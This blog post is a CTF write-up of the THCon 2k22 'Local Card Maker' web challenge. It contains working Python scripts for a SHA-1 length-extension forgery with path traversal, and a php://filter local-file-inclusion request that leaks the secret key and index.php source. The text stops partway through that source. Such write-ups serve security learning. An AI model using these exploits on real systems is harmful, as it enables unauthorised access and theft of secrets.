<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="width=device-width,initial-scale=1.0" name=viewport><link href=https://guylewin.com/rss.xml rel=alternate title=RSS type=application/rss+xml><title>Guy Lewin's Blog | THCon 2k22 CTF - "Local Card Maker" Writeup</title><link as=style href=https://guylewin.com/css/style.css rel=preload><link crossorigin href=https://raw.githack.com/Speyll/suCSS/main/reset-min.css rel=stylesheet><link crossorigin href=https://raw.githack.com/Speyll/suCSS/main/suCSS-min.css rel=stylesheet><link href=https://guylewin.com/css/style.css rel=stylesheet><link href=https://guylewin.com/css/custom.css rel=stylesheet><link href=https://guylewin.com/favicon.ico rel=icon><script src="https://www.googletagmanager.com/gtag/js?id=G-YEJ89F03YG" async></script><script>window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());

            gtag('config', 'G-YEJ89F03YG');</script><meta content="A detailed writeup of solving a web exploitation challenge involving PHP LFI, SHA-1 hash extension attacks, and file inclusion vulnerabilities to achieve remote code execution." name=description><meta content="A detailed writeup of solving a web exploitation challenge involving PHP LFI, SHA-1 hash extension attacks, and file inclusion vulnerabilities to achieve remote code execution." property=og:description><meta content="A detailed writeup of solving a web exploitation challenge involving PHP LFI, SHA-1 hash extension attacks, and file inclusion vulnerabilities to achieve remote code execution." name=twitter:description><meta content="ctf, exploit, lfi, php, rce, sha-1, web" name=keywords><meta content=Zola name=generator><meta content=English name=language><meta content="index, follow" name=robots><meta content="index, follow" name=googlebot><meta content=en_US property=og:locale><meta content="Guy Lewin's Blog" property=og:site_name><meta content='Guy Lewin&#39;s Blog | THCon 2k22 CTF - "Local Card Maker" Writeup' property=og:title><meta content=https://guylewin.com/blog/2022-04-17-thcon-2k22-ctf-local-card-maker-writeup/ property=og:url><meta content=article property=og:type><meta content=summary_large_image name=twitter:card><meta content='Guy Lewin&#39;s Blog | THCon 2k22 CTF - "Local Card Maker" Writeup' name=twitter:title><link href=https://guylewin.com/blog/2022-04-17-thcon-2k22-ctf-local-card-maker-writeup/ rel=canonical><meta content="Guy Lewin" name=author><meta content="Guy Lewin" property=og:author><meta content=2022-04-17T00:00:00Z property=article:published_time><meta content="Guy Lewin" property=article:author><meta content=Blog property=article:section><meta content=ctf property=article:tag><meta content=exploit property=article:tag><meta content=lfi property=article:tag><meta content=php property=article:tag><meta content=rce property=article:tag><meta content=sha-1 property=article:tag><meta content=web property=article:tag><script type=application/ld+json>
{
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "THCon 2k22 CTF - &quot;Local Card Maker&quot; Writeup",
    
    "author": {
        "@type": "Person",
        "name": "Guy Lewin"
    },
    
    
    "datePublished": "2022-04-17",
    
    "description": "A detailed writeup of solving a web exploitation challenge involving PHP LFI, SHA-1 hash extension attacks, and file inclusion vulnerabilities to achieve remote code execution.",
    "publisher": {
        "@type": "Organization",
        "name": "Guy Lewin&#x27;s Blog"
    }
}
</script><body><nav id=nav-bar><div class=nav-social><a class=icon-link href=https://www.threads.com/@guylewin target=_blank><svg class=icon><use href=https://guylewin.com/icons.svg#threads></use></svg></a><a class=icon-link href=https://www.linkedin.com/in/guy-lewin-48b00712 target=_blank><svg class=icon><use href=https://guylewin.com/icons.svg#linkedin></use></svg></a><a class=icon-link href=https://github.com/GuyLewin target=_blank><svg class=icon><use href=https://guylewin.com/icons.svg#github></use></svg></a><a class=icon-link href=mailto:contact@guylewin.com target=_blank><svg class=icon><use href=https://guylewin.com/icons.svg#email></use></svg></a></div><div class=nav-menu><a href=/> /blog/ </a><a href=/about> /about/ </a></div><div class=nav-controls><div aria-label="Toggle theme" class=theme-toggle data-icon-base=https://guylewin.com/icons.svg data-icon-dark=#darkMode data-icon-light=#lightMode data-sound-src=https://guylewin.com/click.ogg id=theme-toggle role=button tabindex=0><svg class=icon><use id=theme-icon></use></svg></div></div></nav><main><article class=post><header class=post-header><time datetime=2022-04-17>Published on: <span class=accent-data>2022-04-17</span> </time><address rel=author>By <span class=accent-data>Guy Lewin</span></address><h1>THCon 2k22 CTF - "Local Card Maker" Writeup</h1></header><div class=post-content><p>I participated in <a rel="noopener external" href=https://ctf.thcon.party/ target=_blank>THCon 2k22 CTF</a> and amongst the incredible "web" challenges - my favorite was "Local Card Maker" (made by <code>jrjgjk</code>). In this post I'll describe the challenge and my step-by-step solution.<h2 id=the-challenge>The Challenge</h2><p><img alt="Description in the CTF portal" src=/images/posts/thcon-2k22-ctf-local-card-maker-writeup/1.png><p>Right off the bat we can tell there’s going to be some SHA-1 (<em>"secure hash algorithm 1"</em>) with a 23 character "secret key". The attached ZIP file contained only the following <code>scan.txt</code> file:<pre class=giallo style=color:#e1e4e8;background-color:#24292e><code data-lang=plain><span class=giallo-l><span>PAGE	|	HTTP_STATUS</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span>/index.php   ==> 200</span></span>
<span class=giallo-l><span>/phpinfo.php ==> 200</span></span>
<span class=giallo-l><span>/change_profile.php ==> 200</span></span>
<span class=giallo-l><span>/view_profile.php ==> 200</span></span></code></pre><p>The goal is to read the content of <code>/flag.txt</code>.<h2 id=exploring-the-site>Exploring the Site</h2><p>The site has 2 interesting pages I could find:<p><img alt=View src=/images/posts/thcon-2k22-ctf-local-card-maker-writeup/2.png> <img alt=Edit src=/images/posts/thcon-2k22-ctf-local-card-maker-writeup/3.png><p>The edit page sets a cookie (<code>user_data</code>) with the PHP-serialized <code>User</code> object set in the form (along with another cookie - <code>user_hash</code> to sign that data), and the view page displays that information if the hash is valid. I tried modifying <code>user_data</code> in multiple ways but kept getting hash validation errors. I decided to put that aside and try a different direction.<p>The URLs of these pages - <code>http://challenges1.thcon.party:2001/index.php?page=Y2hhbmdlX3Byb2ZpbGU=&pHash=0171caa8e7a1fe56361fdce865e6e174b3b892f9</code> and <code>http://challenges1.thcon.party:2001/index.php?page=dmlld19wcm9maWxl&pHash=7b6f8b016f25da478b9f28f878aa3be8cced66fd</code> - both seem to go through <code>index.php</code> for rendering. The <code>page</code> parameter is base64-encoded "change_profile" and "view_profile" which matches the files in <code>scan.txt</code>!<p>When I tried to access <code>/phpinfo.php</code>, <code>/change_profile.php</code> or <code>/view_profile.php</code> directly I received an error ("Direct access to this page is disable.").<p>Theoretically - we can access <code>phpinfo.php</code> if we could put that value (Base64-encoded) in the <code>page</code> query parameter - but without finding the proper hash the validation will keep failing.<h2 id=sha-1-exploitation>SHA-1 Exploitation</h2><p>A quick Google search led me to <a rel="noopener external" href=https://journal.batard.info/post/2011/03/04/exploiting-sha-1-signed-messages target=_blank>this article</a> which seemed like the perfect solution - if I have data and SHA-1 hash on it with a salt prefix (of known length) - I can append data to it and calculate a valid hash, without knowing the salt! To understand this section better - I recommend reading the article before proceeding.<p>I relied heavily on <a rel="noopener external" href=https://github.com/nicolasff/pysha1 target=_blank>the code from the article <code>nicolasff</code> posted on GitHub</a> to create a script to fetch <code>phpinfo.php</code>:<pre class=giallo style=color:#e1e4e8;background-color:#24292e><code data-lang=python><span class=giallo-l><span style=color:#f97583>import</span><span> struct</span></span>
<span class=giallo-l><span style=color:#f97583>import</span><span> base64</span></span>
<span class=giallo-l><span style=color:#f97583>import</span><span> urllib.parse</span></span>
<span class=giallo-l><span style=color:#f97583>import</span><span> requests</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#6a737d># The code below is based on https://github.com/nicolasff/pysha1 (adapted to Python3) until line 87:</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span>top</span><span style=color:#f97583> = 0x</span><span style=color:#79b8ff>ffffffff</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#f97583>def</span><span style=color:#b392f0> rotl</span><span>(i, n):</span></span>
<span class=giallo-l><span>    lmask</span><span style=color:#f97583> =</span><span> top</span><span style=color:#f97583> &lt;&lt;</span><span> (</span><span style=color:#79b8ff>32</span><span style=color:#f97583>-</span><span>n)</span></span>
<span class=giallo-l><span>    rmask</span><span style=color:#f97583> =</span><span> top</span><span style=color:#f97583> >></span><span> n</span></span>
<span class=giallo-l><span>    l</span><span style=color:#f97583> =</span><span> i</span><span style=color:#f97583> &</span><span> lmask</span></span>
<span class=giallo-l><span>    r</span><span style=color:#f97583> =</span><span> i</span><span style=color:#f97583> &</span><span> rmask</span></span>
<span class=giallo-l><span>    newl</span><span style=color:#f97583> =</span><span> r</span><span style=color:#f97583> &lt;&lt;</span><span> n</span></span>
<span class=giallo-l><span>    newr</span><span style=color:#f97583> =</span><span> l</span><span style=color:#f97583> >></span><span> (</span><span style=color:#79b8ff>32</span><span style=color:#f97583>-</span><span>n)</span></span>
<span class=giallo-l><span style=color:#f97583>    return</span><span> newl</span><span style=color:#f97583> +</span><span> newr</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#f97583>def</span><span style=color:#b392f0> add</span><span>(l):</span></span>
<span class=giallo-l><span>    ret</span><span style=color:#f97583> =</span><span style=color:#79b8ff> 0</span></span>
<span class=giallo-l><span style=color:#f97583>    for</span><span> e</span><span style=color:#f97583> in</span><span> l:</span></span>
<span class=giallo-l><span>        ret</span><span style=color:#f97583> =</span><span> (ret</span><span style=color:#f97583> +</span><span> e)</span><span style=color:#f97583> &</span><span> top</span></span>
<span class=giallo-l><span style=color:#f97583>    return</span><span> ret</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#ffab70>xrange</span><span style=color:#f97583> =</span><span style=color:#79b8ff> range</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#f97583>def</span><span style=color:#b392f0> sha1_impl</span><span>(msg, h0, h1, h2, h3, h4):</span></span>
<span class=giallo-l><span style=color:#f97583>    for</span><span> j</span><span style=color:#f97583> in</span><span style=color:#ffab70> xrange</span><span>(</span><span style=color:#79b8ff>int</span><span>(</span><span style=color:#79b8ff>len</span><span>(msg)</span><span style=color:#f97583> /</span><span style=color:#79b8ff> 64</span><span>)):</span></span>
<span class=giallo-l><span>        chunk</span><span style=color:#f97583> =</span><span> msg[j</span><span style=color:#f97583> *</span><span style=color:#79b8ff> 64</span><span>: (j</span><span style=color:#f97583>+</span><span style=color:#79b8ff>1</span><span>)</span><span style=color:#f97583> *</span><span style=color:#79b8ff> 64</span><span>]</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span>        w</span><span style=color:#f97583> =</span><span> {}</span></span>
<span class=giallo-l><span style=color:#f97583>        for</span><span> i</span><span style=color:#f97583> in</span><span style=color:#ffab70> xrange</span><span>(</span><span style=color:#79b8ff>16</span><span>):</span></span>
<span class=giallo-l><span>            word</span><span style=color:#f97583> =</span><span> chunk[i</span><span style=color:#f97583>*</span><span style=color:#79b8ff>4</span><span>: (i</span><span style=color:#f97583>+</span><span style=color:#79b8ff>1</span><span>)</span><span style=color:#f97583>*</span><span style=color:#79b8ff>4</span><span>]</span></span>
<span class=giallo-l><span>            (w[i],)</span><span style=color:#f97583> =</span><span> struct.unpack(</span><span style=color:#9ecbff>">i"</span><span>, word)</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#f97583>        for</span><span> i</span><span style=color:#f97583> in</span><span style=color:#79b8ff> range</span><span>(</span><span style=color:#79b8ff>16</span><span>,</span><span style=color:#79b8ff> 80</span><span>):</span></span>
<span class=giallo-l><span>            w[i]</span><span style=color:#f97583> =</span><span> rotl((w[i</span><span style=color:#f97583>-</span><span style=color:#79b8ff>3</span><span>]</span><span style=color:#f97583> ^</span><span> w[i</span><span style=color:#f97583>-</span><span style=color:#79b8ff>8</span><span>]</span><span style=color:#f97583> ^</span><span> w[i</span><span style=color:#f97583>-</span><span style=color:#79b8ff>14</span><span>]</span><span style=color:#f97583> ^</span><span> w[i</span><span style=color:#f97583>-</span><span style=color:#79b8ff>16</span><span>])</span><span style=color:#f97583> &</span><span> top,</span><span style=color:#79b8ff> 1</span><span>)</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span>        a</span><span style=color:#f97583> =</span><span> h0</span></span>
<span class=giallo-l><span>        b</span><span style=color:#f97583> =</span><span> h1</span></span>
<span class=giallo-l><span>        c</span><span style=color:#f97583> =</span><span> h2</span></span>
<span class=giallo-l><span>        d</span><span style=color:#f97583> =</span><span> h3</span></span>
<span class=giallo-l><span>        e</span><span style=color:#f97583> =</span><span> h4</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#f97583>        for</span><span> i</span><span style=color:#f97583> in</span><span style=color:#79b8ff> range</span><span>(</span><span style=color:#79b8ff>0</span><span>,</span><span style=color:#79b8ff> 80</span><span>):</span></span>
<span class=giallo-l><span style=color:#f97583>            if</span><span style=color:#79b8ff> 0</span><span style=color:#f97583> &lt;=</span><span> i</span><span style=color:#f97583> &lt;=</span><span style=color:#79b8ff> 19</span><span>:</span></span>
<span class=giallo-l><span>                f</span><span style=color:#f97583> =</span><span> (b</span><span style=color:#f97583> &</span><span> c)</span><span style=color:#f97583> |</span><span> ((</span><span style=color:#f97583>~</span><span> b)</span><span style=color:#f97583> &</span><span> d)</span></span>
<span class=giallo-l><span>                k</span><span style=color:#f97583> = 0x</span><span style=color:#79b8ff>5A827999</span></span>
<span class=giallo-l><span style=color:#f97583>            elif</span><span style=color:#79b8ff> 20</span><span style=color:#f97583> &lt;=</span><span> i</span><span style=color:#f97583> &lt;=</span><span style=color:#79b8ff> 39</span><span>:</span></span>
<span class=giallo-l><span>                f</span><span style=color:#f97583> =</span><span> b</span><span style=color:#f97583> ^</span><span> c</span><span style=color:#f97583> ^</span><span> d</span></span>
<span class=giallo-l><span>                k</span><span style=color:#f97583> = 0x</span><span style=color:#79b8ff>6ED9EBA1</span></span>
<span class=giallo-l><span style=color:#f97583>            elif</span><span style=color:#79b8ff> 40</span><span style=color:#f97583> &lt;=</span><span> i</span><span style=color:#f97583> &lt;=</span><span style=color:#79b8ff> 59</span><span>:</span></span>
<span class=giallo-l><span>                f</span><span style=color:#f97583> =</span><span> (b</span><span style=color:#f97583> &</span><span> c)</span><span style=color:#f97583> |</span><span> (b</span><span style=color:#f97583> &</span><span> d)</span><span style=color:#f97583> |</span><span> (c</span><span style=color:#f97583> &</span><span> d)</span></span>
<span class=giallo-l><span>                k</span><span style=color:#f97583> = 0x</span><span style=color:#79b8ff>8F1BBCDC</span></span>
<span class=giallo-l><span style=color:#f97583>            elif</span><span style=color:#79b8ff> 60</span><span style=color:#f97583> &lt;=</span><span> i</span><span style=color:#f97583> &lt;=</span><span style=color:#79b8ff> 79</span><span>:</span></span>
<span class=giallo-l><span>                f</span><span style=color:#f97583> =</span><span> b</span><span style=color:#f97583> ^</span><span> c</span><span style=color:#f97583> ^</span><span> d</span></span>
<span class=giallo-l><span>                k</span><span style=color:#f97583> = 0x</span><span style=color:#79b8ff>CA62C1D6</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span>            temp</span><span style=color:#f97583> =</span><span> add([rotl(a,</span><span style=color:#79b8ff> 5</span><span>), f, e, k, w[i]])</span></span>
<span class=giallo-l><span>            e</span><span style=color:#f97583> =</span><span> d</span></span>
<span class=giallo-l><span>            d</span><span style=color:#f97583> =</span><span> c</span></span>
<span class=giallo-l><span>            c</span><span style=color:#f97583> =</span><span> rotl(b,</span><span style=color:#79b8ff> 30</span><span>)</span></span>
<span class=giallo-l><span>            b</span><span style=color:#f97583> =</span><span> a</span></span>
<span class=giallo-l><span>            a</span><span style=color:#f97583> =</span><span> temp</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span>        h0</span><span style=color:#f97583> =</span><span> add([h0, a])</span></span>
<span class=giallo-l><span>        h1</span><span style=color:#f97583> =</span><span> add([h1, b])</span></span>
<span class=giallo-l><span>        h2</span><span style=color:#f97583> =</span><span> add([h2, c])</span></span>
<span class=giallo-l><span>        h3</span><span style=color:#f97583> =</span><span> add([h3, d])</span></span>
<span class=giallo-l><span>        h4</span><span style=color:#f97583> =</span><span> add([h4, e])</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#f97583>    return</span><span> (h0, h1, h2, h3, h4)</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#f97583>def</span><span style=color:#b392f0> pad</span><span>(msg, sz</span><span style=color:#f97583> =</span><span style=color:#79b8ff> None</span><span>):</span></span>
<span class=giallo-l><span style=color:#f97583>    if</span><span> sz</span><span style=color:#f97583> ==</span><span style=color:#79b8ff> None</span><span>:</span></span>
<span class=giallo-l><span>        sz</span><span style=color:#f97583> =</span><span style=color:#79b8ff> len</span><span>(msg)</span></span>
<span class=giallo-l><span>    bits</span><span style=color:#f97583> =</span><span> sz</span><span style=color:#f97583> *</span><span style=color:#79b8ff> 8</span></span>
<span class=giallo-l><span>    padding</span><span style=color:#f97583> =</span><span style=color:#79b8ff> 512</span><span style=color:#f97583> -</span><span> ((bits</span><span style=color:#f97583> +</span><span style=color:#79b8ff> 8</span><span>)</span><span style=color:#f97583> %</span><span style=color:#79b8ff> 512</span><span>)</span><span style=color:#f97583> -</span><span style=color:#79b8ff> 64</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span>    msg</span><span style=color:#f97583> += b</span><span style=color:#9ecbff>"</span><span style=color:#79b8ff>\x80</span><span style=color:#9ecbff>"</span><span style=color:#6a737d>  # append bit "1", and a few zeros.</span></span>
<span class=giallo-l><span style=color:#f97583>    return</span><span> msg</span><span style=color:#f97583> +</span><span style=color:#79b8ff> int</span><span>(padding</span><span style=color:#f97583> /</span><span style=color:#79b8ff> 8</span><span>)</span><span style=color:#f97583> * b</span><span style=color:#9ecbff>"</span><span style=color:#79b8ff>\x00</span><span style=color:#9ecbff>"</span><span style=color:#f97583> +</span><span> struct.pack(</span><span style=color:#9ecbff>">q"</span><span>, bits)</span><span style=color:#6a737d>  # don't count the \x80 here, hence the -8.</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#f97583>def</span><span style=color:#b392f0> sha1</span><span>(msg):</span></span>
<span class=giallo-l><span style=color:#6a737d>    # These are the constants in a standard SHA-1</span></span>
<span class=giallo-l><span style=color:#f97583>    return</span><span> sha1_impl(pad(msg),</span><span style=color:#f97583> 0x</span><span style=color:#79b8ff>67452301</span><span> ,</span><span style=color:#f97583> 0x</span><span style=color:#79b8ff>efcdab89</span><span> ,</span><span style=color:#f97583> 0x</span><span style=color:#79b8ff>98badcfe</span><span> ,</span><span style=color:#f97583> 0x</span><span style=color:#79b8ff>10325476</span><span> ,</span><span style=color:#f97583> 0x</span><span style=color:#79b8ff>c3d2e1f0</span><span>)</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#6a737d># "Local Card Maker"-specific implementation starts here:</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#f97583>def</span><span style=color:#b392f0> sha1_bytes_to_str</span><span>(result):</span></span>
<span class=giallo-l><span style=color:#f97583>    return</span><span style=color:#9ecbff> ''</span><span>.join([</span><span style=color:#79b8ff>hex</span><span>(x)[</span><span style=color:#79b8ff>2</span><span>:].zfill(</span><span style=color:#79b8ff>2</span><span>)</span><span style=color:#f97583> for</span><span> x</span><span style=color:#f97583> in</span><span> result])</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#f97583>def</span><span style=color:#b392f0> get_h_values</span><span>(hash_string):</span></span>
<span class=giallo-l><span style=color:#6a737d>    # Divide hash_string to 5 ints, 4 bytes each</span></span>
<span class=giallo-l><span style=color:#f97583>    return</span><span> [</span><span style=color:#79b8ff>int</span><span>(hash_string[i</span><span style=color:#f97583>*</span><span style=color:#79b8ff>8</span><span>:(i</span><span style=color:#f97583>+</span><span style=color:#79b8ff>1</span><span>)</span><span style=color:#f97583>*</span><span style=color:#79b8ff>8</span><span>],</span><span style=color:#79b8ff> 16</span><span>)</span><span style=color:#f97583> for</span><span> i</span><span style=color:#f97583> in</span><span style=color:#79b8ff> range</span><span>(</span><span style=color:#79b8ff>5</span><span>)]</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#6a737d># "view_profile" taken from site ("page" query parameter)</span></span>
<span class=giallo-l><span>block_1_buf</span><span style=color:#f97583> = b</span><span style=color:#9ecbff>"dmlld19wcm9maWxl"</span></span>
<span class=giallo-l><span style=color:#6a737d># Hash taken from site ("pHash" query parameter)</span></span>
<span class=giallo-l><span>block_1_hash</span><span style=color:#f97583> = b</span><span style=color:#9ecbff>"7b6f8b016f25da478b9f28f878aa3be8cced66fd"</span></span>
<span class=giallo-l><span>block_1_h_values</span><span style=color:#f97583> =</span><span> get_h_values(block_1_hash)</span></span>
<span class=giallo-l><span style=color:#6a737d># taken from description of challenge</span></span>
<span class=giallo-l><span>salt_len</span><span style=color:#f97583> =</span><span style=color:#79b8ff> 23</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#6a737d># "aaa" is padding, since the previous SHA-1 block contains the length at the end which is parsed by PHP as Base64 data.</span></span>
<span class=giallo-l><span style=color:#6a737d># I align to 4 bytes in order for the appended path to be parsed correctly.</span></span>
<span class=giallo-l><span>block_2_buf</span><span style=color:#f97583> = b</span><span style=color:#9ecbff>"aaa"</span><span style=color:#f97583> +</span><span> base64.encodebytes(</span><span style=color:#f97583>b</span><span style=color:#9ecbff>"/.././././././././phpinfo"</span><span>).replace(</span><span style=color:#f97583>b</span><span style=color:#9ecbff>"</span><span style=color:#79b8ff>\n</span><span style=color:#9ecbff>"</span><span>,</span><span style=color:#f97583> b</span><span style=color:#9ecbff>""</span><span>)</span></span>
<span class=giallo-l><span style=color:#6a737d># Pad this second block, use a custom size with additional 64 bytes to account for the first block (which is always padded to 64)</span></span>
<span class=giallo-l><span>block_2_buf_padded</span><span style=color:#f97583> =</span><span> pad(block_2_buf,</span><span style=color:#79b8ff> len</span><span>(block_2_buf)</span><span style=color:#f97583> +</span><span style=color:#79b8ff> 64</span><span>)</span></span>
<span class=giallo-l><span>joined_buf_hash</span><span style=color:#f97583> =</span><span> sha1_bytes_to_str(sha1_impl(block_2_buf_padded,</span><span style=color:#f97583> *</span><span>block_1_h_values))</span></span>
<span class=giallo-l><span style=color:#79b8ff>print</span><span>(joined_buf_hash)</span></span>
<span class=giallo-l><span style=color:#6a737d># Add 23 "A"s to simulate the SHA-1 block creation with the salt, but remove the salt since it'll be added by the server.</span></span>
<span class=giallo-l><span>joined_buf</span><span style=color:#f97583> =</span><span> pad((</span><span style=color:#f97583>b</span><span style=color:#9ecbff>"A"</span><span style=color:#f97583> *</span><span> salt_len)</span><span style=color:#f97583> +</span><span> block_1_buf)[salt_len:]</span><span style=color:#f97583> +</span><span> block_2_buf</span></span>
<span class=giallo-l><span>encoded_joined_buf</span><span style=color:#f97583> =</span><span> urllib.parse.quote_plus(joined_buf)</span></span>
<span class=giallo-l><span style=color:#79b8ff>print</span><span>(encoded_joined_buf)</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#79b8ff>print</span><span>(requests.get(</span><span style=color:#9ecbff>"http://challenges1.thcon.party:2001/index.php?page=</span><span style=color:#79b8ff>%s</span><span style=color:#9ecbff>&pHash=</span><span style=color:#79b8ff>%s</span><span style=color:#9ecbff>"</span><span style=color:#f97583> %</span><span> (encoded_joined_buf, joined_buf_hash)).content)</span></span></code></pre><p>In the code above we use the "view_profile" page (encoded as <code>dmlld19wcm9maWxl</code> in Base64) along with the salted hash (<code>7b6f8b016f25da478b9f28f878aa3be8cced66fd</code>) from the site URL. We pad that to a SHA-1 block (64 bytes including the salt, first byte after data is 0x80 and last 2 bytes are length) and add a 2nd block: <code>aaa + base64("/.././././././././phpinfo")</code>.<p>We add 3 bytes (<code>"aaa"</code>) because the last byte of the previous SHA-1 block (as you can see below - 0x38 in yellow) is identified by PHP as a Base64 data byte. Aligning that to 4 bytes makes the following Base64-encoded string correctly readable (since Base64 is read aligned to 4 bytes).<p>The result <code>joined_buf</code> which we were able to sign (before URL encoding) is:<p><img alt src=/images/posts/thcon-2k22-ctf-local-card-maker-writeup/4.png><p>The first part (green) is the original Base64-encoded string (containing "view_profile"). The red <code>0x80</code> is the end-of-string marker added in SHA-1. Afterwards, the white <code>0x00</code> bytes are padding to complete the first chunk to 64 bytes (taking into account that 23 bytes were also used for salt and 2 bytes are used for length). The yellow <code>0x01 0x38</code> is chunk length in bits. It equals 0x138 = 312 bits = 39 bytes which is calculated by: <code>len("dmlld19wcm9maWxl") + key_length = 16 + 23 = 39</code>. The next 3 blue-colored <code>0x61</code> bytes are the padding I mentioned previously to align our Base64 string for PHP. The rest of the purple bytes are the Base64 payload.<p>When PHP receives this payload with a valid hash - it parses the Base64-encoded path as: <code>view_profile&lt;unprintable characters>/.././././././././phpinfo</code> - which will be resolved into <code>phpinfo</code> and appended by the app logic with <code>.php</code>. Now we got to read what’s in <code>phpinfo.php</code>!<h2 id=phpinfo>phpinfo</h2><p>If you’re unfamiliar with <a rel="noopener external" href=https://www.php.net/manual/en/function.phpinfo.php target=_blank><code>phpinfo()</code></a> - it’s a built-in function that prints useful information about PHP and the environment it’s running on. Here’s how it looks like when running from our exploited URL (<code>phpinfo.php</code> simply calls <code>phpinfo()</code>):<p><img alt src=/images/posts/thcon-2k22-ctf-local-card-maker-writeup/5.png> Within this page I found a good lead - the key used as the SHA-1 salt! The key was shown here because it’s defined as a PHP variable:<p><img alt src=/images/posts/thcon-2k22-ctf-local-card-maker-writeup/6.png> But this key isn’t enough to retrieve the flag from /flag.txt - we can’t load a .txt file since the <code>index.php</code> loader code appends <code>.php</code> to every Base64 payload we give it.<h2 id=bonus-leaking-index-php-file-contents>Bonus - Leaking index.php File Contents</h2><p>I wanted to make sure I understand how <code>index.php</code> works internally, so equipped with the secret key I leaked the content of index.php:<pre class=giallo style=color:#e1e4e8;background-color:#24292e><code data-lang=python><span class=giallo-l><span style=color:#f97583>import</span><span> base64</span></span>
<span class=giallo-l><span style=color:#f97583>import</span><span> hashlib</span></span>
<span class=giallo-l><span style=color:#f97583>import</span><span> requests</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span>php_file</span><span style=color:#f97583> = b</span><span style=color:#9ecbff>"index"</span></span>
<span class=giallo-l><span>path</span><span style=color:#f97583> = b</span><span style=color:#9ecbff>"php://filter/convert.base64-encode/resource=</span><span style=color:#79b8ff>%s</span><span style=color:#9ecbff>"</span><span style=color:#f97583> %</span><span> (php_file,)</span></span>
<span class=giallo-l><span>key_salt</span><span style=color:#f97583> = b</span><span style=color:#9ecbff>"Thcon_SuP3r_S3cr4t_K3y!"</span></span>
<span class=giallo-l><span>buf</span><span style=color:#f97583> =</span><span> base64.encodebytes(path).replace(</span><span style=color:#f97583>b</span><span style=color:#9ecbff>"</span><span style=color:#79b8ff>\n</span><span style=color:#9ecbff>"</span><span>,</span><span style=color:#f97583> b</span><span style=color:#9ecbff>""</span><span>)</span></span>
<span class=giallo-l><span>buf_hash</span><span style=color:#f97583> =</span><span> hashlib.sha1(key_salt</span><span style=color:#f97583> +</span><span> buf).hexdigest()</span></span>
<span class=giallo-l><span>buf</span><span style=color:#f97583> =</span><span> buf.decode()</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#79b8ff>print</span><span>(requests.get(</span><span style=color:#9ecbff>"http://challenges1.thcon.party:2001/index.php?page=</span><span style=color:#79b8ff>%s</span><span style=color:#9ecbff>&pHash=</span><span style=color:#79b8ff>%s</span><span style=color:#9ecbff>"</span><span style=color:#f97583> %</span><span> (buf, buf_hash)).content)</span></span></code></pre><p>The result is Base64-encoded <code>index.php</code>. Here it is after decoding, to better understand how this challenge works:<pre class=giallo style=color:#e1e4e8;background-color:#24292e><code data-lang=php><span class=giallo-l><span style=color:#f97583>&lt;?</span><span style=color:#79b8ff>php</span></span>
<span class=giallo-l><span style=color:#79b8ff>session_start</span><span>();</span></span>
<span class=giallo-l><span style=color:#f97583>require</span><span>(</span><span style=color:#9ecbff>"crypto.php"</span><span>);</span></span>
<span class=giallo-l><span>$safe_handler</span><span style=color:#f97583> = new</span><span style=color:#79b8ff> IntegrityHandler</span><span>($_SERVER[</span><span style=color:#9ecbff>'SECRET_KEY'</span><span>],</span><span style=color:#9ecbff> 'sha1'</span><span>);</span></span>
<span class=giallo-l><span style=color:#79b8ff>define</span><span>(</span><span style=color:#9ecbff>"LOCAL_ACCESS"</span><span>,</span><span style=color:#79b8ff> 1</span><span>);</span></span>
<span class=giallo-l></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#f97583>function</span><span style=color:#b392f0> createHeaders</span><span>($pArray, $handler){</span></span>
<span class=giallo-l><span style=color:#79b8ff>	echo</span><span style=color:#9ecbff> '&lt;a href="/">&lt;li>Home&lt;/li>&lt;/a>'</span><span>;</span></span>
<span class=giallo-l><span style=color:#f97583>	foreach</span><span>($pArray</span><span style=color:#f97583> as</span><span> $p</span><span style=color:#f97583> =></span><span> $v){</span></span>
<span class=giallo-l><span style=color:#79b8ff>		echo</span><span style=color:#9ecbff> "&lt;a href='/index.php?page="</span><span style=color:#f97583> .</span><span style=color:#79b8ff> base64_encode</span><span>($p)</span><span style=color:#f97583> .</span><span style=color:#9ecbff>"&pHash="</span><span style=color:#f97583> .</span><span> $handler</span><span style=color:#f97583>-></span><span style=color:#b392f0>secure_data</span><span>(</span><span style=color:#79b8ff>base64_encode</span><span>($p))</span><span style=color:#f97583> .</span><span style=color:#9ecbff> "' />&lt;li></span><span>$v</span><span style=color:#9ecbff>&lt;/li>&lt;/a>"</span><span>;</span></span>
<span class=giallo-l><span>	}</span></span>
<span class=giallo-l><span>}</span></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#f97583>?></span></span>
<span class=giallo-l></span>
<span class=giallo-l></span>
<span class=giallo-l><span style=color:#f97583>&lt;</span><span style=color:#79b8ff>html</span><span style=color:#f97583>></span></span>
<span class=giallo-l><span style=color:#f97583>&lt;</span><span style=color:#79b8ff>head</span><span style=color:#f97583>></span></span>
